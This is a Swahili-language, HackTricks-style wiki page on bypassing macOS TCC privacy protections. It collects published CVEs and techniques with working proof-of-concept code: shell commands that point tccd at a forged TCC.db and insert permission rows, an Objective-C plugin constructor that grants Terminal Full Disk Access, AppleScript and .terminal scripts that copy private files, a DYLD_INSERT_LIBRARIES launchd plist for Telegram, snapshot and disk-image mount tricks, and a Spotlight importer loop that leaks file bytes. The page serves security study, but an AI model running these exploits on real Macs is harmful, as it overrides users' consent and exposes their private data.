# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

Kwa maelezo kuhusu uhifadhi wa ruhusa za TCC na utambuzi wa sender/target wa Automation, angalia [muhtasari wa macOS TCC](../index.html#identify-apple-events-sender-and-target-grants).

## Kulingana na utendaji

### Write Bypass

Huu si bypass; hivi ndivyo TCC inavyofanya kazi: **hailindi dhidi ya kuandika**. Ikiwa Terminal **haina ruhusa ya kusoma Desktop ya mtumiaji, bado inaweza kuandika humo**:

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

The **extended attribute `com.apple.macl`** huongezwa kwenye **file** mpya ili kuipa **app ya creator** ruhusa ya kuisoma.<sup>[[2]](#references)</sup>

### TCC ClickJacking

Inawezekana **kuweka dirisha juu ya kidokezo cha TCC** ili kumfanya mtumiaji **akubali** bila kutambua. Unaweza kupata PoC katika [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Mshambuliaji anaweza **kuunda apps zenye jina lolote** (k.m. Finder, Google Chrome...) katika **`Info.plist`** na kuzifanya ziombe ruhusa ya kufikia eneo linalolindwa na TCC. Mtumiaji atadhani kwamba programu halali ndiyo inayoomba ruhusa hiyo.\
Zaidi ya hayo, inawezekana **kuondoa app halali kwenye Dock na kuweka fake app hapo**, ili mtumiaji akibofya fake app (ambayo inaweza kutumia ikoni ileile), app hiyo iite app halali, iombe ruhusa za TCC na kutekeleza malware, huku mtumiaji akiamini kwamba app halali ndiyo iliyoomba ruhusa hiyo.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Maelezo zaidi na PoC zinapatikana katika:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Kwa chaguomsingi, ufikiaji kupitia **SSH ulikuwa na "Full Disk Access"**. Ili kuizima, SSH lazima ionekane kwenye orodha lakini iwe imezimwa (kuiondoa kwenye orodha hakutaondoa ruhusa hizo):<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: Kwa chaguomsingi, ufikiaji kupitia SSH ulikuwa na "Full Disk Access". Ili kuizima, SSH lazima ionekane kwenye orodha lakini iwe imezimwa (kuiondoa...](<../../../../../images/image (1077).png>)

Hapa unaweza kupata mifano ya **malwares zilizoweza kukwepa kinga hii**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> Kumbuka kwamba sasa, ili uweze kuwezesha SSH unahitaji **Full Disk Access**

### Handle extensions - CVE-2022-26767

Sifa **`com.apple.macl`** hupewa files ili kuipa **app fulani ruhusa ya kuzisoma.** Sifa hii huwekwa unapofanya **drag\&drop** ya file juu ya app, au mtumiaji **anapobofya mara mbili** file ili kuifungua kwa **app chaguomsingi**.

Kwa hiyo, mtumiaji anaweza **kusajili app hasidi** ili ishughulikie extensions zote na kuita Launch Services ili **kufungua** file yoyote (hivyo file hasidi itapewa ruhusa ya kusomwa).<sup>[[23]](#references)</sup>

### iCloud

Entitlement **`com.apple.private.icloud-account-access`** huwezesha mawasiliano na huduma ya XPC **`com.apple.iCloudHelper`**, ambayo **hutoa iCloud tokens**.

**iMovie** na **Garageband** zilikuwa na entitlement hii na nyingine zilizoruhusu.

Kwa **maelezo** zaidi kuhusu exploit ya **kupata iCloud tokens** kupitia entitlement hiyo, tazama hotuba: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### Kuvuja kwa data kupitia majina ya arifa za Darwin za Spotlight importer

Spotlight importer inaweza kusoma file ambayo Spotlight hupitisha kwenye callback yake ya `GetMetadataForFile`, hata wakati process ya kawaida isiyo na Full Disk Access haiwezi kuisoma. Tofauti na [code injection kwenye process iliyoidhinishwa na TCC](../macos-tcc-credential-and-data-theft.md), njia hii inahitaji foothold ya ndani inayoweza kusakinisha importer na tukio linalolingana la kuorodhesha faili na Spotlight. Importer iko kwenye sandbox, lakini arifa za Darwin zinazotumia majina pekee zinaweza kupeleka bytes kwa listener aliye nje ya sandbox hiyo. Hii ni njia ya kuvuja kwa data, si njia ya kupata root au ruhusa ya kusoma file yoyote kupitia importer.<sup>[[24]](#references)</sup>

Tangaza aina ya file lengwa chini ya `CFBundleDocumentTypes` → `LSItemContentTypes` katika `Info.plist` ya importer, kisha sakinisha bundle katika `~/Library/Spotlight/` au `Contents/Library/Spotlight/` ya app. Hakiki usajili kwa kutumia `mdimport -L`. Sehemu ya [Spotlight importer](../../../../macos-auto-start-locations.md#spotlight-plugins) inaeleza uwekaji wa bundle na ulinganishaji wa aina za file. Importer hupokea tu files ambazo Spotlight imeichagua; importer iliyopo kwa kawaida huwa na kipaumbele. Kwenye macOS 26 Tahoe, `mdimport -i` haikulazimisha kwa uhakika uorodheshaji wa haraka unaojumuisha folda ndogo katika majaribio yaliyoripotiwa, ilhali `mdimport -r ~/Library/Spotlight/Spotlight.mdimporter` iliomba faili za UTIs zinazodaiwa na importer hiyo ziingizwe tena kwenye orodha.<sup>[[24]](#references)</sup>

Ili kujaribu njia hii, anzisha listener nje ya sandbox kwa `notifyutil -w TEST_TEST_TEST`, kisha tuma arifa kwa kutumia `CFNotificationCenterGetDarwinNotifyCenter()` na object na `userInfo` zikiwa `NULL`. Tofauti na arifa iliyosambazwa yenye payload ya `userInfo`, arifa ya Darwin ina jina lake pekee. Kwa data ya binary, sajili listener wa nje kwa majina ya desimali `0` hadi `255` kwa kutumia `notify_register_dispatch`; linganisha usajili wa kila callback na thamani ya byte yake. Ndani ya `GetMetadataForFile`, soma tu `pathToFile` iliyotolewa na Spotlight na tuma kila byte kama jina la arifa la desimali:<sup>[[24]](#references)</sup>

```objectivec
NSData *data = readBytes(pathToFile); // helper reading Spotlight's selected file
const uint8_t *bytes = data.bytes;
for (NSUInteger i = 0; i < data.length; i++) {
    CFStringRef name = CFStringCreateWithFormat(NULL, NULL,
                                                 CFSTR("%u"), bytes[i]);
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(),
                                         name, NULL, NULL, true);
    CFRelease(name);
}
```

Msikilizaji huunda upya mfuatano wa byte badala ya kusoma faili inayolindwa na TCC yenyewe. PoC iliyochapishwa ilirejesha byte 64 za kwanza za `knowledgeC.db` kutoka kwenye terminal isiyo na FDA huku SIP ikiwa imewashwa kwenye macOS 26. Njia hii ina bandwidth ndogo na si ya kuaminika kwa kunakili data nyingi: Spotlight huenda isiweke faili lengwa kwenye faharasa au isiweke upya faharasa yake, na matukio ya importer yanayoendeshwa kwa wakati mmoja yanaweza kuchanganya mitiririko ya arifa. Tazama [macOS Sandbox Debug & Bypass](../../macos-sandbox/macos-sandbox-debug-and-bypass/) kwa mbinu nyingine za kuvuka mipaka ya sandbox.<sup>[[24]](#references)</sup>

### kTCCServiceAppleEvents / Automation

App yenye ruhusa ya **`kTCCServiceAppleEvents`** itaweza **kudhibiti Apps nyingine**. Hii inamaanisha kuwa inaweza **kutumia vibaya ruhusa zilizotolewa kwa Apps hizo**.<sup>[[2]](#references)</sup>

Kwa maelezo zaidi kuhusu Apple Scripts, angalia:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Kwa mfano, ikiwa App ina **ruhusa ya Automation juu ya `iTerm`**, basi katika mfano huu **`Terminal`** ina ufikiaji wa iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Kupitia iTerm

Terminal, ambayo haina FDA, inaweza kuita iTerm, ambayo ina FDA, na kuitumia kutekeleza vitendo:

```applescript:iterm.script
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```

```bash
osascript iterm.script
```

#### Kupitia Finder

Au ikiwa App ina ufikiaji kupitia Finder, inaweza kutumia script kama hii:

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## Kwa tabia ya App

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

**tccd daemon** ya userland ilikuwa ikitumia variable ya **`HOME`** **env** kufikia hifadhidata ya TCC ya watumiaji kutoka: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Kulingana na [chapisho hili la Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), na kwa kuwa TCC daemon inaendeshwa kupitia `launchd` ndani ya domain ya mtumiaji wa sasa, inawezekana **kudhibiti variables zote za mazingira** zinazopitishwa kwake.<sup>[[19]](#references)</sup>\
Hivyo, **mshambulizi anaweza kuweka variable ya mazingira `$HOME`** katika **`launchctl`** ili ielekeze kwenye **directory** inayodhibitiwa, **kuanzisha upya** **TCC** daemon, kisha **kurekebisha moja kwa moja hifadhidata ya TCC** ili kujipa **kila ruhusa ya TCC inayopatikana** bila kumwomba mtumiaji wa mwisho ruhusa wakati wowote.<sup>[[1]](#references)</sup>\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notes

Notes ilikuwa na ufikiaji wa maeneo yanayolindwa na TCC, lakini note mpya iliyoundwa **ilihifadhiwa katika eneo lisilolindwa**. Kwa hiyo, mshambuliaji angeweza kuiomba Notes inakili faili iliyolindwa kwenye note, kisha afikie data iliyotokana na hilo katika eneo lisilolindwa:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Binary `/usr/libexec/lsd` pamoja na library `libsecurity_translocate` ilikuwa na entitlement `com.apple.private.nullfs_allow` iliyoiruhusu kuunda mount ya **nullfs**, na ilikuwa na entitlement `com.apple.private.tcc.allow` yenye **`kTCCServiceSystemPolicyAllFiles`** ili kufikia kila faili.

Iliwezekana kuongeza sifa ya quarantine kwenye "Library", kuita huduma ya XPC **`com.apple.security.translocation`**, kisha ingeweka Library kwenye **`$TMPDIR/AppTranslocation/d/d/Library`**, ambapo nyaraka zote ndani ya Library zingeweza **kufikiwa**.

### CVE-2024-44131 - FileProvider symlink race

Programu zinazokabidhi utendakazi wa faili kwa **msaidizi mwenye mapendeleo ya juu** (hapa **`fileproviderd`** / `Files.app`) hunakili au kuhamisha vipengee **kwa niaba ya mtumiaji**, kwa hiyo nakala hutekelezwa kwa mapendeleo ya msaidizi badala ya ya mwitaji.

Jamf Threat Labs ilionyesha kuwa uthibitishaji wa symlink unaofanywa kabla ya operesheni unaweza **kushindaniwa**: badala ya kuweka symlink kwenye kipengele cha njia cha **mwisho** (kinachokaguliwa), mshambuliaji hubadilisha saraka **ya kati** ya njia **baada ya kunakili kuanza tayari**. Kisha msaidizi mwenye mapendeleo ya juu hufuata kiungo kinachodhibitiwa na mshambuliaji na kusoma/kuandika maeneo yanayolindwa na TCC **bila kuonyesha kidokezo chochote**.<sup>[[5]](#references)</sup>

Saraka ambazo **hazijalindwa** na UUID nasibu kwenye njia yake (kwa mfano `~/Library/Mobile Documents/com~apple~CloudDocs`) ndizo shabaha rahisi zaidi, kwa sababu mshambuliaji anaweza kutabiri njia kamili ya kushindania.

> [!TIP]
> Huu ndio muundo wa jumla wa kuangalia: **mchakato wowote wenye mapendeleo ya juu unaotatua njia zaidi ya mara moja** (kagua-kisha-tumia, au `rename()`/`copyfile()` zinazotatua chanzo na lengwa kando) unaweza kushindaniwa kwa kubadilisha saraka katikati ya njia. `O_NOFOLLOW_ANY` pekee, `openat()` kwenye FD ya saraka ambayo tayari imefunguliwa, au `realpath()` + uthibitishaji upya ndizo zinazofunga pengo hilo.

Maelezo zaidi katika [**maelezo ya Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` inaweza kujengwa ikiwa na `SQLITE_ENABLE_SQLLOG`, inayoongeza hook ya logging inayoendeshwa na environment variables ([`test_sqllog.c` ya upstream](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – kwa **kila database inayofunguliwa**, **nakala ya faili ya database** na logi ya kauli za SQL huandikwa kwenye `path` (saraka lazima iwepo tayari).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – tengeneza **nakala mpya kila mara** DB inapofunguliwa/kuambatishwa badala ya kutumia tena iliyopo.
- **`SQLITE_SQLLOG_CONDITIONAL`** – logi ya muunganisho itengenezwe tu ikiwa faili ya `<database>-sqllog` ipo karibu na DB kuu.

Ikiwa unaweza kuingiza variable hii kwenye mchakato wenye **FDA** unaofungua SQLite databases, utanakili kwa urahisi **databases hizo zilizolindwa** kwenye saraka unayodhibiti. Kwa kuwa jina la faili lengwa linatokana na data inayodhibitiwa na mshambuliaji, **symlink iliyowekwa kwenye lengwa** hubadilisha primitive hiyo hiyo kuwa **uandishi wa faili kiholela** kwa kutumia mapendeleo ya mchakato lengwa.

### **SQLITE_AUTO_TRACE**

Ikiwa environment variable **`SQLITE_AUTO_TRACE`** imewekwa, library **`libsqlite3.dylib`** itaanza **kuweka logi** ya queries zote za SQL. Programu nyingi zilitumia library hii, kwa hiyo iliwezekana kuweka logi ya queries zake zote za SQLite.<sup>[[22]](#references)</sup>

Programu kadhaa za Apple zilitumia library hii kufikia taarifa zinazolindwa na TCC.

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### Kutafuta uandishi wa faili unaoendeshwa na env-var

Mifano miwili iliyotangulia ni matukio ya mbinu ileile ya jumla, na inafaa kutafuta mingine: **frameworks zinazopakiwa ndani ya apps zenye ruhusa za TCC mara nyingi hufichua environment variables za debug/logging zinazofanya process iunde faili kwenye path inayodhibitiwa na mpigaji**.

Mchakato wa kuzipata:

1. Chagua lengo lenye ruhusa ya FDA au ruhusa nyingine muhimu ya TCC (`Music`, `TV`, `Terminal`, mawakala wa MDM...) na orodhesha frameworks zinazounganishwa nalo (`otool -L`, `vmmap`).
2. Tafuta strings za `getenv` kwenye frameworks hizo: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Weka variables unazoshuku kupitia `launchctl setenv NAME /path/you/control`, fungua app na uangalie inachofanya kwenye filesystem kwa `fs_usage -w -f filesys <pid>` au `sudo fs_usage | grep <path>`.
4. Ikiwa process **inaunda au kubadilisha jina la** faili kwenye directory yako, una primitive ya kuandika: elekeza destination kwenye symlink (au fanya race kwenye directory ya kati, kama ilivyo kwenye CVE-2024-44131 hapo juu) ili kuielekeza kwenye `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Kuna mambo mawili yanayoweka mipaka hapa. Kwanza, **variables za `DYLD_*` hazizingatiwi kwa binaries zenye hardened runtime** isipokuwa app iwe na entitlement ya [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) ("thamani ya Boolean inayoonyesha kama app inaweza kuathiriwa na environment variables za dynamic linker, ambazo unaweza kutumia kuingiza code kwenye process ya app") — tazama pia [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Pili, Apple huondoa variables za debug za framework moja moja zinaporipotiwa, kwa hiyo variable iliyofanya kazi kwenye toleo moja la macOS mara nyingi huwa imeondolewa kwenye toleo linalofuata. Ikiwa app inakataa kuanza kimyakimya baada ya kuweka variable, ichukulie kuwa variable hiyo tayari imechujwa.<sup>[[7]](#references)[[8]](#references)</sup>

Tazama [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) kwa mbinu sawia inayotumia variables za linker.

### Apple Remote Desktop

Ukiwa root unaweza kuwezesha service hii, na **ARD agent itakuwa na ufikiaji kamili wa diski** ambao mtumiaji anaweza kutumia vibaya kuifanya inakili **database mpya ya mtumiaji ya TCC**.

## Kwa kutumia **NFSHomeDirectory**

TCC hutumia database iliyo kwenye folda ya HOME ya mtumiaji kudhibiti ufikiaji wa rasilimali mahususi kwa mtumiaji, kwenye **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Kwa hiyo, mtumiaji akifanikiwa kuwasha upya TCC huku env variable ya $HOME ikielekeza kwenye **folda tofauti**, anaweza kuunda database mpya ya TCC kwenye **/Library/Application Support/com.apple.TCC/TCC.db** na kuidanganya TCC itoe ruhusa yoyote ya TCC kwa app yoyote.

> [!TIP]
> Kumbuka kuwa Apple hutumia setting iliyohifadhiwa kwenye profile ya mtumiaji, katika attribute ya **`NFSHomeDirectory`**, kama **thamani ya `$HOME`**. Kwa hiyo, ukidhibiti app yenye ruhusa ya kubadilisha thamani hii (**`kTCCServiceSystemPolicySysAdminFiles`**), unaweza **kutumia** chaguo hili kama silaha ya kukwepa TCC.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**POC ya kwanza** hutumia [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) na [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) kubadilisha folda ya **HOME** ya mtumiaji.

1. Pata blob ya _csreq_ ya app lengwa.
2. Weka faili bandia ya _TCC.db_ yenye ufikiaji unaohitajika na blob ya _csreq_.
3. Hamisha ingizo la Directory Services la mtumiaji kwa kutumia [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Badilisha ingizo la Directory Services ili kubadilisha directory ya nyumbani ya mtumiaji.
5. Leta ingizo la Directory Services lililobadilishwa kwa kutumia [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Simamisha _tccd_ ya mtumiaji na uwashe upya process.

POC ya pili ilitumia **`/usr/libexec/configd`**, ambayo ilikuwa na `com.apple.private.tcc.allow` yenye thamani ya `kTCCServiceSystemPolicySysAdminFiles`.\
Iliwezekana kuendesha **`configd`** kwa chaguo la **`-t`**, ambalo lilimwezesha mshambulizi kubainisha **Bundle maalum ya kupakia**. Kwa hiyo, exploit **inabadilisha** mbinu ya **`dsexport`** na **`dsimport`** ya kubadilisha directory ya nyumbani ya mtumiaji kwa **kuingiza code kwenye `configd`**.

Kwa maelezo zaidi, angalia [**ripoti ya awali**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>

## Kwa kuingiza process

Kuna mbinu tofauti za kuingiza code ndani ya process na kutumia vibaya ruhusa zake za TCC:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Aidha, mbinu ya kawaida zaidi ya kuingiza process inayotumika kukwepa TCC ni kupitia **plugins (load library)**.\
Plugins ni code ya ziada, kwa kawaida katika mfumo wa libraries au plist, ambayo **hupakiwa na application kuu** na kutekelezwa katika mazingira yake. Kwa hiyo, ikiwa application kuu ilikuwa na ufikiaji wa faili zilizozuiwa na TCC (kupitia ruhusa au entitlements zilizopewa), **code maalum pia itakuwa na ufikiaji huo**.

### CVE-2020-27937 - Directory Utility

Application `/System/Library/CoreServices/Applications/Directory Utility.app` ilikuwa na entitlement ya **`kTCCServiceSystemPolicySysAdminFiles`**, ilipakia plugins zenye extension ya **`.daplug`**, na **haikuwa na** hardened runtime.

Ili kutumia CVE hii kama silaha, **`NFSHomeDirectory`** **hubadilishwa** (kwa kutumia vibaya entitlement iliyotangulia) ili **kudhibiti database ya TCC ya mtumiaji** na kukwepa TCC.

Kwa maelezo zaidi, angalia [**ripoti ya awali**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** ilikuwa na entitlements `com.apple.security.cs.disable-library-validation` na `com.apple.private.tcc.manager`. Ya kwanza **inaruhusu kuingiza code**, na ya pili huipa ufikiaji wa **kusimamia TCC**.

Binary hii iliruhusu kupakia **plug-ins za wahusika wengine** kutoka kwenye folda `/Library/Audio/Plug-Ins/HAL`. Kwa hiyo, iliwezekana **kupakia plugin na kutumia vibaya ruhusa za TCC** kwa kutumia PoC hii:<sup>[[13]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

    add_tcc_entry();

    NSLog(@"[+] Exploitation finished...");
    exit(0);
```

Kwa maelezo zaidi, angalia [**ripoti asilia**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Programu za mfumo zinazofungua mtiririko wa kamera kupitia Core Media I/O (programu zenye **`kTCCServiceCamera`**) hupakia **plugins hizi ndani ya mchakato** kutoka `/Library/CoreMediaIO/Plug-Ins/DAL` (ambapo hazizuiliwi na SIP).

Kuhifadhi tu maktaba yenye **constructor** ya kawaida humo kutatosha **inject code**.

Programu kadhaa za Apple ziliathiriwa na hatari hii.

### Firefox

Programu ya Firefox ilikuwa na entitlements za `com.apple.security.cs.disable-library-validation` na `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[[14]](#references)</sup>

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```

Kwa maelezo zaidi kuhusu jinsi ya kuitumia kwa urahisi, [**angalia ripoti asili**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

Binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` ilikuwa na entitlements **`com.apple.private.tcc.allow`** na **`com.apple.security.get-task-allow`**, zilizowezesha kuingiza code ndani ya process na kutumia ruhusa za TCC.

### CVE-2023-26818 - Telegram

Telegram ilikuwa na entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** na **`com.apple.security.cs.disable-library-validation`**, hivyo iliwezekana kuitumia vibaya **kupata ufikiaji wa ruhusa zake**, kama vile kurekodi kwa kamera. Unaweza [**kupata payload kwenye writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Angalia jinsi ambavyo iliundwa **plist maalum** ili kutumia env variable kupakia library na **`launchctl`** ikatumika kuizindua:<sup>[[15]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.telegram.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/telegram.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/telegram.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## Kwa kutumia `open`

Inawezekana kutumia **`open`** hata ukiwa sandboxed

### Scripts za Terminal

Ni jambo la kawaida kabisa kuipa Terminal **Full Disk Access (FDA)**, angalau kwenye kompyuta zinazotumiwa na watu wa tech. Pia inawezekana kutumia **`.terminal`** scripts kwa kutumia ruhusa hiyo.

**`.terminal`** scripts ni faili za plist kama hii, zenye amri ya kutekeleza kwenye key ya **`CommandString`**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

Programu inaweza kuandika script ya terminal katika eneo kama /tmp na kuizindua kwa amri kama:

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## Kwa kutumia mount

### CVE-2020-9771 - mount_apfs TCC bypass na privilege escalation

**Mtumiaji yeyote** (hata asiye na privileges) anaweza kuunda na kuweka snapshot ya Time Machine na kupata **ufikiaji wa faili ZOTE** za snapshot hiyo.\
Kinachohitajika pekee chenye privileges ni programu inayotumika (kama `Terminal`) iwe na ruhusa ya **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), ambayo inahitaji kutolewa na admin.<sup>[[2]](#references)</sup>

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```

Maelezo ya kina zaidi [**yanapatikana katika ripoti asili**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - Mount juu ya faili ya TCC

Hata kama faili ya TCC DB imelindwa, iliwezekana **mount juu ya directory** faili mpya ya TCC.db:

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
    os.system("mkdir /tmp/mnt")
